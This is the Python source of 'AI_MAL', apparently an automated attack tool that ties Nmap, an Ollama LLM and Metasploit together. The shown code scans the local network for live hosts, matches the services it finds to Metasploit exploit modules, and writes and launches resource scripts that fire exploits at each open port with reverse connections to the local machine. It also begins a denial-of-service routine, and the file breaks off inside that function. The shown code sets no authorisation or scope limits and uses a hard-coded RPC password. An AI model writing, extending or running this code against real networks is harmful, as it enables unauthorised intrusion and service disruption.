#!/usr/bin/env python3
# Advanced Adaptive Nmap Scanner with Ollama and Metasploit Integration
# This script combines Nmap scanning with Ollama LLM for adaptive reconnaissance
# and optionally integrates with Metasploit for exploitation

import os
import sys
import time
import json
import socket
import random
import logging
import argparse
import ipaddress
import datetime
import subprocess
import threading
import traceback
import re
import netifaces
import requests
import nmap
import multiprocessing
import tempfile
import stat
import signal
import pymetasploit3

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

from typing import List, Dict, Any, Optional, Tuple

# Set up logging
logger = logging.getLogger("adaptive_scanner")
logger.setLevel(logging.INFO)

# Add console handler if not already added
if not logger.handlers:
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
    logger.addHandler(console_handler)

class TerminalViewer:
    """Class to handle terminal output formatting and display."""
    
    def __init__(self, quiet=False):
        self.quiet = quiet
        self.width = self._get_terminal_width()
        self.border_char = "="
        self.section_char = "-"
    
    def _get_terminal_width(self):
        """Get the terminal width or default to 80 columns."""
        try:
            import shutil
            columns = shutil.get_terminal_size().columns
            return min(columns, 100)  # Limit to 100 columns max
        except:
            return 80
    
    def header(self, title, char="="):
        """Display a header with the given title."""
        if self.quiet:
            return
            
        print(f"\n{char * self.width}")
        print(f"{title.center(self.width)}")
        print(f"{char * self.width}")
    
    def section(self, title):
        """Display a section header."""
        if self.quiet:
            return
            
        print(f"\n{self.section_char * self.width}")
        print(f"{title}")
        print(f"{self.section_char * self.width}")
    
    def result_box(self, title, content):
        """Display content in a formatted box with title."""
        if self.quiet:
            return
            
        print(f"\n{self.section_char * self.width}")
        print(f"| {title}")
        print(f"{self.section_char * self.width}")
        print(content)
        print(f"{self.section_char * self.width}")
    
    def status(self, message):
        """Display a status message."""
        if self.quiet:
            return
            
        print(f"[*] {message}")
    
    def success(self, message):
        """Display a success message."""
        if self.quiet:
            return
            
        print(f"\n[+] {message}")
    
    def warning(self, message):
        """Display a warning message."""
        if self.quiet:
            return
            
        print(f"\n[!] {message}")
    
    def error(self, message):
        """Display an error message."""
        # Always show errors, even in quiet mode
        print(f"\n[-] ERROR: {message}")
    
    def scan_summary(self, target, results):
        """Display a summary of scan results."""
        if self.quiet:
            return
            
        if not results:
            self.warning(f"No scan results for {target}")
            return
            
        open_ports = []
        os_info = "Unknown"
        host_info = "Unknown"
        
        # Extract information from results
        if 'scan' in results and target in results['scan']:
            target_info = results['scan'][target]
            
            # Get hostname
            if 'hostnames' in target_info and target_info['hostnames']:
                host_info = target_info['hostnames'][0].get('name', 'Unknown')
                
            # Get OS info if available
            if 'osmatch' in target_info and target_info['osmatch']:
                os_info = target_info['osmatch'][0].get('name', 'Unknown')
                
            # Get open ports
            for proto in ['tcp', 'udp']:
                if proto in target_info:
                    for port, port_data in target_info[proto].items():
                        if port_data['state'] == 'open':
                            service = port_data.get('name', 'unknown')
                            product = port_data.get('product', '')
                            version = port_data.get('version', '')
                            
                            service_str = f"{service}"
                            if product:
                                service_str += f" ({product}"
                                if version:
                                    service_str += f" {version}"
                                service_str += ")"
                                
                            open_ports.append(f"{port}/{proto}: {service_str}")
        
        # Format the summary
        summary = []
        summary.append(f"Target: {target} ({host_info})")
        summary.append(f"OS: {os_info}")
        summary.append(f"Open Ports: {len(open_ports)}")
        
        for port in open_ports:
            summary.append(f"  - {port}")
            
        self.result_box(f"SCAN SUMMARY FOR {target}", "\n".join(summary))
    
    def exploit_summary(self, target, exploit_results):
        """Display a summary of exploitation attempts."""
        if self.quiet:
            return
            
        if not exploit_results:
            self.warning(f"No exploitation results for {target}")
            return
            
        summary = []
        summary.append(f"Target: {target}")
        summary.append(f"Total Exploits Attempted: {exploit_results.get('total_attempts', 0)}")
        summary.append(f"Successful Exploits: {exploit_results.get('successful', 0)}")
        
        # List successful exploits
        if 'details' in exploit_results:
            for port, exploits in exploit_results['details'].items():
                for exploit in exploits:
                    status = "✓" if exploit.get('success', False) else "✗"
                    summary.append(f"  {status} {port}: {exploit.get('name', 'Unknown')}")
        
        self.result_box(f"EXPLOITATION SUMMARY FOR {target}", "\n".join(summary))
    
    def script_generation_summary(self, script_path, script_type, summary):
        """Display a summary of generated script."""
        if self.quiet:
            return
            
        if not script_path:
            self.warning("Script generation failed")
            return
            
        info = []
        info.append(f"Script Type: {script_type}")
        info.append(f"Location: {os.path.abspath(script_path)}")
        info.append(f"Summary: {summary}")
        
        self.result_box(f"GENERATED SCRIPT: {os.path.basename(script_path)}", "\n".join(info))
    
    def script_execution_summary(self, script_path, return_code, output):
        """Display a summary of script execution."""
        if self.quiet:
            return
            
        if not script_path:
            self.warning("Script execution failed")
            return
            
        info = []
        info.append(f"Status: {'Completed Successfully' if return_code == 0 else 'Failed'}")
        
        # Trim output if it's too long
        if output and len(output) > 500:
            output = output[:500] + "...\n[Output truncated]"
            
        if output:
            info.append("\nOutput:")
            info.append(output)
        
        self.result_box(f"SCRIPT EXECUTION: {os.path.basename(script_path)}", "\n".join(info))
    
    def dos_attack_summary(self, target, successful, method=None):
        """Display a summary of DoS attack results."""
        if self.quiet:
            return
            
        info = []
        info.append(f"Target: {target}")
        info.append(f"Status: {'SUCCESS - Target Unreachable' if successful else 'FAILED - Target Still Responding'}")
        
        if method:
            info.append(f"Method: {method}")
            
        self.result_box("DENIAL OF SERVICE ATTACK RESULTS", "\n".join(info))

    def progress_bar(self, current, total, prefix='Progress:', suffix='Complete', length=50, fill='█'):
        """Display a progress bar in the terminal."""
        if self.quiet:
            return
            
        percent = ("{0:.1f}").format(100 * (current / float(total)))
        filled_length = int(length * current // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        print(f'\r{prefix} |{bar}| {percent}% {suffix}', end='\r')
        
        # Print new line on complete
        if current == total:
            print()
    
    def display_start_banner(self, target, scan_type, model):
        """Display a banner when the scanner starts."""
        if self.quiet:
            return
            
        import platform
        import getpass
        
        banner = []
        banner.append(f"\n{'=' * self.width}")
        banner.append(f"{'AI_MAL ADAPTIVE SCANNER'.center(self.width)}")
        banner.append(f"{'=' * self.width}")
        banner.append(f"Target: {target}")
        banner.append(f"Scan Type: {scan_type}")
        banner.append(f"Model: {model}")
        banner.append(f"OS: {platform.system()} {platform.release()}")
        banner.append(f"User: {getpass.getuser()}")
        banner.append(f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        banner.append(f"{'=' * self.width}")
        
        print("\n".join(banner))

    def scanning_animation(self, text, duration=5, interval=0.1):
        """Display a scanning animation for the specified duration."""
        if self.quiet:
            return
            
        import itertools
        import time
        import threading
        
        animation = itertools.cycle(['|', '/', '-', '\\'])
        stop_animation = threading.Event()
        
        def animate():
            for _ in range(int(duration / interval)):
                if stop_animation.is_set():
                    break
                print(f'\r[{next(animation)}] {text}', end='')
                time.sleep(interval)
            print(f'\r[✓] {text} - Complete' + ' ' * 20)
            
        t = threading.Thread(target=animate)
        t.start()
        
        return stop_animation

class NetworkDiscovery:
    """Class to handle automatic network discovery."""
    
    def __init__(self, interface=None, network=None, timeout=1):
        self.interface = interface
        self.network = network  # Can be specified in CIDR notation (e.g., "192.168.1.0/24")
        self.timeout = timeout
        
    def get_interface_info(self):
        """Get information about the selected network interface."""
        try:
            # If interface is specified, use it
            if self.interface:
                if self.interface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(self.interface)
                    if netifaces.AF_INET in addrs:
                        ipinfo = addrs[netifaces.AF_INET][0]
                        return {
                            'interface': self.interface,
                            'addr': ipinfo['addr'],
                            'netmask': ipinfo.get('netmask', '255.255.255.0')
                        }
                    else:
                        logger.error(f"Interface {self.interface} has no IPv4 address")
                else:
                    logger.error(f"Interface {self.interface} not found")
            
            # If no interface is specified or the specified one is invalid, find default
            gws = netifaces.gateways()
            if 'default' in gws and netifaces.AF_INET in gws['default']:
                default_gw, default_iface = gws['default'][netifaces.AF_INET]
                addrs = netifaces.ifaddresses(default_iface)
                if netifaces.AF_INET in addrs:
                    ipinfo = addrs[netifaces.AF_INET][0]
                    self.interface = default_iface  # Save the found interface
                    return {
                        'interface': default_iface,
                        'addr': ipinfo['addr'],
                        'netmask': ipinfo.get('netmask', '255.255.255.0')
                    }
            
            # If still not found, try the first interface with an IPv4 address
            for iface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ipinfo = addrs[netifaces.AF_INET][0]
                    if ipinfo['addr'] != '127.0.0.1':  # Skip loopback
                        self.interface = iface  # Save the found interface
                        return {
                            'interface': iface,
                            'addr': ipinfo['addr'],
                            'netmask': ipinfo.get('netmask', '255.255.255.0')
                        }
            
            # If all else fails, fall back to localhost
            logger.warning("Could not find a suitable network interface, using localhost")
            return {
                'interface': 'lo',
                'addr': '127.0.0.1',
                'netmask': '255.0.0.0'
            }
            
        except Exception as e:
            logger.error(f"Error getting interface information: {str(e)}")
            logger.debug(traceback.format_exc())
            return {
                'interface': 'unknown',
                'addr': '127.0.0.1',
                'netmask': '255.255.255.0'
            }
    
    def get_network_cidr(self):
        """Get the network address in CIDR notation (e.g., 192.168.1.0/24)."""
        # If network is already specified, use it
        if self.network:
            return self.network
        
        try:
            # Get interface info
            interface_info = self.get_interface_info()
            ip = interface_info['addr']
            netmask = interface_info['netmask']
            
            # Convert IP and netmask to network address
            ip_obj = ipaddress.IPv4Address(ip)
            netmask_obj = ipaddress.IPv4Address(netmask)
            
            # Calculate network address
            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
            
            # Calculate prefix length from netmask
            prefix_len = bin(int(netmask_obj)).count('1')
            
            # Create CIDR notation
            cidr = f"{network_addr}/{prefix_len}"
            
            logger.info(f"Determined network: {cidr}")
            self.network = cidr
            return cidr
            
        except Exception as e:
            logger.error(f"Error calculating network CIDR: {str(e)}")
            logger.debug(traceback.format_exc())
            return "192.168.1.0/24"  # Default fallback
    
    def ping_host(self, host):
        """Check if a host is up using a ping."""
        try:
            if os.name == "nt":  # Windows
                ping_cmd = ["ping", "-n", "1", "-w", str(int(self.timeout * 1000)), host]
            else:  # Unix/Linux
                ping_cmd = ["ping", "-c", "1", "-W", str(int(self.timeout)), host]
                
            result = subprocess.run(ping_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return result.returncode == 0
            
        except Exception as e:
            logger.debug(f"Error pinging {host}: {str(e)}")
            return False
    
    def get_all_hosts(self):
        """Get all possible hosts in the network."""
        try:
            network_cidr = self.get_network_cidr()
            network = ipaddress.IPv4Network(network_cidr, strict=False)
            
            # Get all hosts in the network (excluding network address and broadcast)
            hosts = [str(host) for host in network.hosts()]
            
            return hosts
        except Exception as e:
            logger.error(f"Error getting hosts from network: {str(e)}")
            logger.debug(traceback.format_exc())
            return []
    
    def discover_hosts(self):
        """Discover active hosts in the network using parallel pings."""
        logger.info("Starting host discovery...")
        
        try:
            # Get all possible hosts
            all_hosts = self.get_all_hosts()
            
            if not all_hosts:
                logger.warning("No hosts found in network")
                return []
            
            logger.info(f"Scanning {len(all_hosts)} potential hosts in {self.network}...")
            
            # Use multiprocessing to speed up discovery
            active_hosts = []
            
            # Handle smaller networks directly
            if len(all_hosts) <= 256:
                with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
                    results = pool.map(self.ping_host, all_hosts)
                    active_hosts = [host for host, is_up in zip(all_hosts, results) if is_up]
            else:
                # For larger networks, process in batches
                batch_size = 256
                for i in range(0, len(all_hosts), batch_size):
                    batch = all_hosts[i:i+batch_size]
                    with multiprocessing.Pool(processes=min(os.cpu_count(), 64)) as pool:
                        results = pool.map(self.ping_host, batch)
                        active_hosts.extend([host for host, is_up in zip(batch, results) if is_up])
                    
                    logger.info(f"Processed {i+len(batch)}/{len(all_hosts)} hosts, found {len(active_hosts)} active")
            
            # Add our own IP to the list if not already there
            own_ip = self.get_interface_info().get('addr')
            if own_ip and own_ip not in active_hosts and own_ip != "127.0.0.1":
                active_hosts.append(own_ip)
            
            logger.info(f"Host discovery complete. Found {len(active_hosts)} active hosts.")
            return active_hosts
            
        except Exception as e:
            logger.error(f"Error during host discovery: {str(e)}")
            logger.debug(traceback.format_exc())
            
            # Try to at least return our own IP
            try:
                own_ip = self.get_interface_info().get('addr')
                if own_ip and own_ip != "127.0.0.1":
                    return [own_ip]
            except:
                pass
                
            return []

    def discover_networks(self):
        """Discover additional networks connected to this host."""
        try:
            # Get all interfaces
            networks = []
            for iface in netifaces.interfaces():
                # Skip loopback
                if iface == 'lo':
                    continue
                
                # Get addresses for this interface
                if netifaces.AF_INET in netifaces.ifaddresses(iface):
                    for addr_info in netifaces.ifaddresses(iface)[netifaces.AF_INET]:
                        if 'addr' in addr_info and 'netmask' in addr_info:
                            ip = addr_info['addr']
                            netmask = addr_info['netmask']
                            
                            # Skip localhost
                            if ip.startswith('127.'):
                                continue
                                
                            # Calculate network CIDR
                            ip_obj = ipaddress.IPv4Address(ip)
                            netmask_obj = ipaddress.IPv4Address(netmask)
                            network_addr = ipaddress.IPv4Address(int(ip_obj) & int(netmask_obj))
                            prefix_len = bin(int(netmask_obj)).count('1')
                            cidr = f"{network_addr}/{prefix_len}"
                            
                            if cidr not in networks:
                                networks.append(cidr)
            
            return networks
            
        except Exception as e:
            logger.error(f"Error discovering networks: {str(e)}")
            logger.debug(traceback.format_exc())
            return []
    
    def alternative_host_discovery(self):
        """Alternative method to discover hosts using Nmap ARP scan."""
        try:
            logger.info("Using Nmap ARP scan for host discovery")
            
            # Use nmap to perform ARP scan
            nm = nmap.PortScanner()
            network_cidr = self.get_network_cidr()
            
            # Run ARP scan
            nm.scan(hosts=network_cidr, arguments='-sn -PR')
            
            # Extract hosts
            hosts = [host for host in nm.all_hosts() if host != '']
            
            if hosts:
                logger.info(f"Nmap ARP scan found {len(hosts)} hosts")
                return hosts
            else:
                logger.warning("Nmap ARP scan found no hosts")
                return []
                
        except Exception as e:
            logger.error(f"Error in alternative host discovery: {str(e)}")
            logger.debug(traceback.format_exc())
            return []

class AdaptiveNmapScanner:
    """Adaptive Nmap scanner that uses LLMs to optimize scan strategies."""
    
    def __init__(
        self,
        target=None,
        ollama_model="qwen2.5-coder:7b",
        max_iterations=3,
        continuous=False,
        delay=2,
        msf_integration=False,
        exploit=False,
        msf_workspace="adaptive_scan",
        stealth=False,
        auto_script=False,
        quiet=False,
        debug=False,
        auto_discover=False,
        interface=None,
        scan_all=False,
        network=None,
        host_timeout=1,
        custom_scripts=False,
        script_type="bash",
        execute_scripts=False,
        dos_attack=False
    ):
        # Set up logging
        self.logger = logging.getLogger("adaptive_scanner")
        
        # Configure console handler if logging level changed
        if debug:
            self.logger.setLevel(logging.DEBUG)
        elif quiet:
            self.logger.setLevel(logging.WARNING)
        else:
            self.logger.setLevel(logging.INFO)
        
        # Runtime configuration
        self.target = target
        self.ollama_model = ollama_model
        self.max_iterations = max_iterations
        self.continuous = continuous
        self.delay = delay
        self.stealth = stealth
        self.auto_discover = auto_discover
        self.interface = interface
        self.scan_all = scan_all
        self.network = network
        self.host_timeout = host_timeout
        
        # Metasploit configuration
        self.msf_integration = msf_integration
        self.exploit = exploit
        self.msf_workspace = msf_workspace
        self.auto_script = auto_script
        
        # Script generation
        self.custom_scripts = custom_scripts
        self.script_type = script_type
        self.execute_scripts = execute_scripts
        self.generated_scripts = []  # Track generated scripts
        
        # State variables
        self.running = True
        self.scan_history = []
        self.discovered_services = {}
        self.current_scan_phase = 0
        self.results = {}
        self.targets = []
        self.current_target_index = 0
        self.discovered_hosts = []
        self.metasploit = None
        
        # Network discovery
        if auto_discover or network or interface:
            self.network_discovery = NetworkDiscovery(
                interface=interface,
                network=network,
                timeout=host_timeout
            )
        else:
            # Initialize with a minimal NetworkDiscovery for ping functionality
            # even when auto-discovery is not enabled
            self.network_discovery = NetworkDiscovery(timeout=host_timeout)
        
        # Create terminal viewer
        self.viewer = TerminalViewer(quiet=quiet)
        
        # Log initialization
        logger.info(f"Initialized Adaptive Nmap Scanner")
        if target:
            logger.info(f"Initial target: {target}")
        if auto_discover:
            logger.info(f"Auto-discovery enabled")
        if custom_scripts:
            logger.info(f"AI script generation enabled")
            if execute_scripts:
                logger.info(f"Automatic script execution enabled")
        
        # Set up signal handler for clean termination
        signal.signal(signal.SIGINT, self._signal_handler)
        
        # If auto-discovery is enabled, perform it now
        if self.auto_discover:
            self._discover_network()
        
        # Initialize Metasploit if enabled
        if self.msf_integration:
            self.setup_metasploit()
        
        # DoS attack
        self.dos_attack = dos_attack
    
    def _discover_network(self):
        """Discover the network and hosts."""
        logger.info("Starting network discovery process")
        
        self.network_discovery = NetworkDiscovery(self.interface)
        
        # Get network information
        interface_info = self.network_discovery.get_interface_info()
        logger.info(f"Local IP: {interface_info['addr']}, Netmask: {interface_info['netmask']}")
        
        # Get network CIDR
        network_cidr = self.network_discovery.get_network_cidr()
        logger.info(f"Network CIDR: {network_cidr}")
        
        # Discover other networks
        self.networks = self.network_discovery.discover_networks()
        if self.networks:
            networks_str = ', '.join(self.networks)
            logger.info(f"Discovered additional networks: {networks_str}")
        
        # Discover hosts
        logger.info("Discovering hosts on the network(s)...")
        
        # Start with the primary network
        discovered = self.network_discovery.discover_hosts()
        
        # Try alternative discovery if primary method finds no hosts
        if not discovered:
            logger.info("Primary discovery method found no hosts, trying alternative method")
            discovered = self.network_discovery.alternative_host_discovery()
        
        # Remove local IP from the list if present
        if interface_info['addr'] in discovered:
            discovered.remove(interface_info['addr'])
        
        self.discovered_hosts = discovered
        
        if discovered:
            logger.info(f"Discovered {len(discovered)} hosts: {', '.join(discovered[:5])}" + 
                        (f"... and {len(discovered)-5} more" if len(discovered) > 5 else ""))
            
            # If no target was specified, set the first discovered host as the target
            if not self.target and self.discovered_hosts:
                self.target = self.discovered_hosts[0]
                logger.info(f"No target specified, using first discovered host: {self.target}")
        else:
            logger.warning("No hosts discovered on the network")
            if not self.target:
                logger.error("No target specified and no hosts discovered. Exiting.")
                sys.exit(1)
    
    def next_target(self) -> bool:
        """Move to the next target in the list of discovered hosts."""
        if not self.discovered_hosts:
            return False
            
        self.current_target_index += 1
        if self.current_target_index >= len(self.discovered_hosts):
            logger.info("Reached the end of the target list")
            return False
            
        # Reset state for the new target
        self.target = self.discovered_hosts[self.current_target_index]
        self.scan_history = []
        self.iteration = 0
        self.discovered_services = {}
        
        logger.info(f"Moving to next target: {self.target}")
        return True
    
    def _signal_handler(self, sig, frame):
        """Handle CTRL+C to gracefully terminate the scanning process."""
        logger.warning("Received termination signal. Finishing current scan and exiting...")
        self.running = False
    
    def setup_metasploit(self):
        """Set up the Metasploit connection."""
        if not self.msf_integration:
            return
            
        self.logger.info("Setting up Metasploit connection...")
        self.viewer.status("Connecting to Metasploit RPC daemon...")
        
        # Default connection parameters
        host = "127.0.0.1"
        port = 55553
        user = "msf"
        password = "msf_password"
        
        # Try to connect to msfrpcd
        try:
            # Set a timeout for connection attempts
            connection_timeout = 10  # seconds
            
            # Display connection info
            self.viewer.status(f"Trying to connect to msfrpcd at {host}:{port} (timeout: {connection_timeout}s)")
            
            # Try to connect with timeout
            import socket
            original_timeout = socket.getdefaulttimeout()
            socket.setdefaulttimeout(connection_timeout)
            
            try:
                self.metasploit = pymetasploit3.msfrpc.MsfRpcClient(
                    password,
                    server=host,
                    port=port,
                    ssl=True
                )
                self.logger.info("Successfully connected to msfrpcd")
                self.viewer.success("Connected to Metasploit RPC daemon")
            except Exception as e:
                self.logger.info(f"Could not connect to msfrpcd. Error: {str(e)}")
                self.viewer.warning(f"Could not connect to msfrpcd: {str(e)}")
                
                # Try to start msfrpcd service
                self.viewer.status("Starting msfrpcd service...")
                try:
                    # Try both systemd and direct command approaches
                    if os.path.exists("/etc/systemd/system/msfrpcd.service"):
                        subprocess.run(["systemctl", "start", "msfrpcd.service"], 
                                      check=False, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                        self.viewer.status("Waiting for msfrpcd service to start (via systemd)...")
                    else:
                        # Start msfrpcd directly
                        subprocess.Popen(
                            ["msfrpcd", "-P", password, "-S", "-a", host, "-p", str(port)],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            start_new_session=True
                        )
                        self.viewer.status("Waiting for msfrpcd service to start (direct launch)...")
                    
                    # Wait for service to start with timeout and feedback
                    start_time = time.time()
                    max_wait_time = 15  # seconds
                    
                    while time.time() - start_time < max_wait_time:
                        try:
                            # Show countdown
                            remaining = max_wait_time - int(time.time() - start_time)
                            self.viewer.status(f"Connecting to msfrpcd, timeout in {remaining}s...")
                            
                            # Try to connect
                            self.metasploit = pymetasploit3.msfrpc.MsfRpcClient(
                                password,
                                server=host,
                                port=port,
                                ssl=True
                            )
                            self.logger.info("Successfully connected to msfrpcd after starting service")
                            self.viewer.success("Connected to Metasploit RPC daemon")
                            break
                        except Exception:
                            # Wait a bit before trying again
                            time.sleep(1)
                    
                    # If we still couldn't connect after the timeout
                    if not self.metasploit:
                        raise Exception(f"Could not connect to msfrpcd after {max_wait_time} seconds")
                        
                except Exception as start_error:
                    self.logger.error(f"Failed to start msfrpcd service: {str(start_error)}")
                    self.viewer.error(f"Failed to start msfrpcd service. Try manually with:\nsudo msfrpcd -P {password} -S -a {host} -p {port}")
                    self.viewer.error("Then restart AI_MAL")
                    self.msf_integration = False
                    return
            finally:
                # Restore original socket timeout
                socket.setdefaulttimeout(original_timeout)
                
            # Create a workspace if it doesn't exist
            if self.metasploit:
                workspaces = self.metasploit.db.workspaces.list
                if self.msf_workspace not in [w['name'] for w in workspaces]:
                    self.logger.info(f"Creating Metasploit workspace: {self.msf_workspace}")
                    self.metasploit.db.workspaces.add(self.msf_workspace)
                    
                # Select the workspace
                self.metasploit.db.workspaces.set(self.msf_workspace)
                self.logger.info(f"Using Metasploit workspace: {self.msf_workspace}")
                self.viewer.status(f"Using Metasploit workspace: {self.msf_workspace}")
        
        except Exception as e:
            self.logger.error(f"Error setting up Metasploit: {str(e)}")
            self.logger.debug(traceback.format_exc())
            self.viewer.error(f"Error setting up Metasploit: {str(e)}")
            self.msf_integration = False

    def process_results_with_metasploit(self, result):
        """Process the Nmap scan results with Metasploit."""
        if not self.metasploit or not result:
            return
        
        try:
            target = self.target
            if target not in result.get('scan', {}):
                logger.warning(f"Target {target} not found in scan results")
                return
            
            host_data = result['scan'][target]
            
            # Create or update host in MSF database
            logger.info(f"Importing host {target} to Metasploit database")
            
            # Get hostname
            hostname = 'unknown'
            if 'hostnames' in host_data and host_data['hostnames']:
                hostname = host_data['hostnames'][0].get('name', 'unknown')
            
            # Add host to database
            try:
                self.metasploit.db.hosts.report(target, name=hostname)
                logger.info(f"Added host {target} to Metasploit database")
            except Exception as e:
                logger.warning(f"Error adding host to Metasploit: {str(e)}")
            
            # Process open ports
            for protocol in ['tcp', 'udp']:
                if protocol in host_data:
                    for port, port_data in host_data[protocol].items():
                        if port_data['state'] == 'open':
                            service = port_data.get('name', 'unknown')
                            product = port_data.get('product', '')
                            version = port_data.get('version', '')
                            
                            # Add service to database
                            try:
                                self.metasploit.db.services.report(
                                    target, 
                                    port=int(port),
                                    proto=protocol,
                                    name=service,
                                    info=f"{product} {version}".strip()
                                )
                                logger.info(f"Added service {service} on {port}/{protocol} to Metasploit database")
                                
                                # Add to discovered services
                                port_key = f"{port}/{protocol}"
                                self.discovered_services[port_key] = {
                                    "service": service,
                                    "product": product,
                                    "version": version,
                                    "exploited": False
                                }
                            except Exception as e:
                                logger.warning(f"Error adding service to Metasploit: {str(e)}")
            
            # If auto-exploit enabled, find matching exploits
            if self.exploit:
                self.find_matching_exploits()
            
            # If auto-script enabled, generate and run resource script
            if self.auto_script and self.matching_exploits:
                script_path = self.generate_resource_script()
                if script_path:
                    self.run_resource_script(script_path)
        
        except Exception as e:
            logger.error(f"Error processing results with Metasploit: {str(e)}")
            logger.debug(traceback.format_exc())

    def find_matching_exploits(self):
        """Find matching exploits for discovered services."""
        if not self.metasploit or not self.discovered_services:
            return
        
        logger.info("Finding matching exploits for discovered services...")
        
        for port_key, service_info in self.discovered_services.items():
            service = service_info['service']
            product = service_info['product']
            version = service_info['version']
            
            if service == 'unknown':
                continue
            
            search_terms = []
            
            # Different search strategies based on service
            if product:
                # Search by product and version if available
                search_terms.append(f"{product} {version}".strip())
                search_terms.append(product)
            
            # Always include service name
            search_terms.append(service)
            
            # Common services have special searches
            if service in ['http', 'https', 'www']:
                search_terms.append('web')
            elif service in ['smb', 'microsoft-ds']:
                search_terms.extend(['smb', 'windows', 'microsoft'])
            elif service in ['ssh', 'openssh']:
                search_terms.extend(['ssh', 'openssh'])
            elif service in ['ftp']:
                search_terms.extend(['ftp', 'file transfer'])
            
            # Search for each term
            exploits = set()
            for term in search_terms:
                try:
                    search_result = self.metasploit.modules.search(term)
                    for exploit in search_result:
                        # Check if it's a usable exploit or auxiliary module
                        if exploit['type'] in ['exploit', 'auxiliary'] and 'path' in exploit:
                            exploits.add(exploit['path'])
                except Exception as e:
                    logger.warning(f"Error searching for exploits: {str(e)}")
            
            # Store matching exploits
            if exploits:
                self.matching_exploits[port_key] = list(exploits)
                logger.info(f"Found {len(exploits)} potential exploits for {service} on {port_key}")
            else:
                logger.info(f"No exploits found for {service} on {port_key}")
        
        # Log total exploits found
        total_exploits = sum(len(exploits) for exploits in self.matching_exploits.values())
        logger.info(f"Found a total of {total_exploits} potential exploits across all services")

    def generate_resource_script(self):
        """Generate a Metasploit resource script for automated exploitation."""
        if not self.matching_exploits:
            logger.info("No matching exploits to generate resource script")
            return None
        
        try:
            # Create a timestamp for the script name
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            script_name = f"auto_exploit_{timestamp}.rc"
            
            logger.info(f"Generating Metasploit resource script: {script_name}")
            
            with open(script_name, 'w') as f:
                f.write(f"# Auto-generated Metasploit resource script for {self.target}\n")
                f.write(f"# Generated: {timestamp}\n\n")
                
                # Set workspace
                f.write(f"workspace {self.msf_workspace}\n\n")
                
                # Try each exploit for each service
                for port_key, exploits in self.matching_exploits.items():
                    port, protocol = port_key.split('/')
                    service_info = self.discovered_services[port_key]
                    service = service_info['service']
                    
                    f.write(f"# Exploits for {service} on port {port}/{protocol}\n")
                    
                    # Limit to top 3 exploits per service to avoid taking too long
                    for exploit in exploits[:3]:
                        f.write(f"use {exploit}\n")
                        f.write(f"set RHOSTS {self.target}\n")
                        f.write(f"set RPORT {port}\n")
                        
                        # Set common options
                        f.write("set LHOST 0.0.0.0\n")  # This will be replaced with actual local IP
                        f.write("set LPORT 4444\n")
                        
                        # Run exploit with default options
                        f.write("exploit -z\n")
                        
                        # Pause between exploits
                        f.write("sleep 3\n\n")
                
                # Final commands
                f.write("sessions -l\n")
                f.write("# End of script\n")
            
            # Record the script
            self.generated_scripts.append(script_name)
            logger.info(f"Generated resource script: {script_name}")
            
            return script_name
        
        except Exception as e:
            logger.error(f"Error generating resource script: {str(e)}")
            logger.debug(traceback.format_exc())
            return None

    def run_resource_script(self, script_path):
        """Run a Metasploit resource script."""
        if not os.path.exists(script_path):
            logger.error(f"Resource script not found: {script_path}")
            return
        
        try:
            logger.info(f"Running Metasploit resource script: {script_path}")
            
            # Update LHOST in script with local IP
            with open(script_path, 'r') as f:
                content = f.read()
            
            local_ip = self._get_local_ip()
            if local_ip:
                content = content.replace("set LHOST 0.0.0.0", f"set LHOST {local_ip}")
                
                with open(script_path, 'w') as f:
                    f.write(content)
            
            # Run msfconsole with resource script
            command = f"msfconsole -q -r {script_path}"
            logger.info(f"Executing: {command}")
            
            # Run in background to avoid blocking
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Wait a bit to see if it starts
            time.sleep(2)
            logger.info(f"Started Metasploit process with PID: {process.pid}")
            
            # Don't wait for completion to avoid blocking the script
            # This means the script will continue running in background
        
        except Exception as e:
            logger.error(f"Error running resource script: {str(e)}")
            logger.debug(traceback.format_exc())

    def run_exploits_on_host(self, target):
        """Run all matching exploits against a host."""
        if not self.metasploit or not self.matching_exploits:
            return
        
        self.logger.info(f"Running exploits against target: {target}")
        self.viewer.header(f"EXPLOITATION PHASE: {target}", "=")
        
        # Run each exploit through resource script
        script_path = self.generate_resource_script()
        if script_path:
            self.run_resource_script(script_path)
            
            # Mark all services as exploitation attempted
            for port_key in self.matching_exploits.keys():
                if port_key in self.discovered_services:
                    self.discovered_services[port_key]['exploitation_attempted'] = True
            
            # Collect exploitation results for summary
            exploit_results = {
                'total_attempts': sum(len(exploits) for exploits in self.matching_exploits.values()),
                'successful': 0,  # This would need to be updated based on actual results
                'details': self.matching_exploits
            }
            
            self.viewer.exploit_summary(target, exploit_results)

    def _get_local_ip(self):
        """Get the local IP address."""
        try:
            # First try to get the interface for the default route
            if self.network_discovery:
                return self.network_discovery.get_interface_info().get('addr')
            
            # Fallback method
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            self.logger.warning("Could not determine local IP address")
            return "127.0.0.1"

    def perform_dos_attack(self, target):
        """Perform Denial of Service attacks against the target."""
        if not self.dos_attack:
            return False
            
        self.logger.info(f"Attempting DoS attack against {target}")
        self.viewer.header(f"DENIAL OF SERVICE ATTACK: {target}", "=")
        
        try:
            # Check if network_discovery is properly initialized
            if not self.network_discovery:
                self.logger.error("Network discovery is not initialized")
                self.viewer.error("Cannot perform DoS attack: Network discovery is not initialized")
                return False
                
            # First, check if the target is still up
            if not self.network_discovery.ping_host(target):
                self.logger.warning(f"Target {target} is already unreachable")
                self.viewer.warning(f"Target {target} is already unreachable")
                return False
                
            # Use nmap's DoS-related scripts
